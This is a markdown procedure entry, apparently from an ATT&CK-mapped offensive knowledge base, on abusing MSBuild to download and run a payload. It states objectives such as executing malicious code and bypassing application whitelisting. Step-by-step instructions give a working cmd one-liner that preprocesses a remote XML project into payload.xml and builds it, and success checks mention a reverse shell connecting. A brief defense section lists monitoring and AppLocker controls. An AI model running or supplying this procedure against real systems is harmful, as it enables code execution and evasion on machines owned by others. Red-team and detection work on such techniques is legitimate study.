---
id: 1a33bd28-c386-4065-8454-0bf59d529f37
name: Execute-Payload-via-MSBuild-Preprocessing
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:26.997407+00:00'
updated_at: '2023-04-10T20:37:08.901686+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Trusted Developer Utilities|T1127 - Trusted Developer
    Utilities]]
sub_techniques:
  - '[[sub-techniques/MSBuild|T1127.001 - MSBuild]]'
tags:
  - '[[tags/msbuild]]'
  - '[[tags/windows-download-and-execute-methods]]'
commands:
  - '[[commands/msbuild-preprocess-and-execute-via-cmd]]'
tools:
  - '[[tools/MSBuild]]'
platforms:
  - Windows
validated: true
---

# Execute-Payload-via-MSBuild-Preprocessing

## Summary

This procedure uses MSBuild, a trusted Microsoft build tool, to preprocess a remote XML project file containing a base64-encoded payload. The preprocessing expands the file locally, embedding the payload, which is then built and executed to run arbitrary code, bypassing application whitelisting restrictions on Windows systems.

## Description

MSBuild is a legitimate developer utility for building .NET projects, but attackers can abuse it for code execution by crafting XML project files with embedded tasks that decode and run payloads. In this technique, a remote XML file (hosted via WebDAV or similar) references or includes the base64-encoded payload. The /preprocess flag expands the project file, incorporating the payload inline, and the subsequent build executes it. This is effective in targeted attacks for initial access or persistence, as MSBuild is whitelisted and signed by Microsoft. The target environment is Windows with .NET Framework installed. Expected outcomes include successful payload execution, such as spawning a shell or downloading additional tools, without triggering basic AV rules.

## Requirements

1. Access to a Windows target system with .NET Framework 4.0+ installed (MSBuild.exe available).
2. Execute permissions for MSBuild.exe (typically low-privilege user suffices).
3. A remote XML project file hosted on an accessible share (e.g., WebDAV server) containing the base64-encoded payload in a custom task.
4. Network access from the target to the remote XML location.

## Defense

- Implement application whitelisting (e.g., AppLocker, WDAC) to restrict MSBuild.exe to legitimate directories and arguments.
- Monitor MSBuild executions via Sysmon or EDR for suspicious command lines, especially /preprocess with remote paths or base64 content in generated files.
- Block or log network access to unusual shares (e.g., WebDAV) from build tools; use anti-malware to scan generated XML files.
- Enable PowerShell and command-line logging to capture delayed expansion and child process spawns.

## Objectives

1. Download and execute a malicious payload on the target Windows system.
2. Bypass application whitelisting by leveraging the trusted MSBuild utility.
3. Achieve initial access or code execution in a targeted network attack.

## Instructions

### Step 1: Verify MSBuild Accessibility

**Context**: Before execution, confirm MSBuild is present and executable at the expected path to avoid errors. This step ensures the tool is available without needing elevated privileges.

Use the [[tools/MSBuild]] tool to check the path. Manually verify with a simple directory listing if needed, but assume standard installation.

**Expected Output**: MSBuild.exe file exists and is accessible.

If not found, search common .NET Framework directories (e.g., C:\Windows\Microsoft.NET\Framework64\*\MSBuild.exe).

### Step 2: Preprocess and Build the Remote XML Project

**Context**: This core step fetches the remote XML project file, preprocesses it to embed the base64 payload locally as payload.xml, and then builds the expanded file to decode and execute the payload. The use of delayed variable expansion (!MB!) handles path quoting reliably in cmd.

**Command** ([[commands/msbuild-preprocess-and-execute-via-cmd]]):

```cmd
cmd /V /c "set MB=\"$_MSBUILD_PATH\" & !MB! /noautoresponse /preprocess $_REMOTE_XML_PATH > payload.xml & !MB! payload.xml"
```

> This command sets the MSBuild path, preprocesses the remote XML (expanding any imports or properties to include the base64 payload), saves it as payload.xml, and immediately builds it. The /noautoresponse flag prevents interactive prompts. If the remote path is inaccessible, it will fail with a file not found error—verify connectivity first (e.g., via ping or dir \\webdavserver\folder). Success is indicated by the build completing without errors and the payload executing (e.g., a calculator pops up for testing or a reverse shell connects).

### Step 3: Verify Payload Execution

**Context**: Confirm the payload ran successfully by checking for expected side effects, such as new processes, network connections, or file artifacts. This validates the technique worked and allows cleanup if needed.

Monitor with tools like Task Manager or netstat. For a test payload (e.g., encoded calc.exe), expect the calculator to launch. In a real attack, check listener for incoming connections.

**Expected Output**: Payload artifacts appear, such as spawned processes or remote connections.

**Success Indicators**:
- No build errors in console output (e.g., "Build succeeded.")
- payload.xml generated with embedded base64 content (inspect manually if needed)
- Payload effects observed (e.g., shell access or file drop)

If unsuccessful, check remote XML syntax, network access, or MSBuild version compatibility.
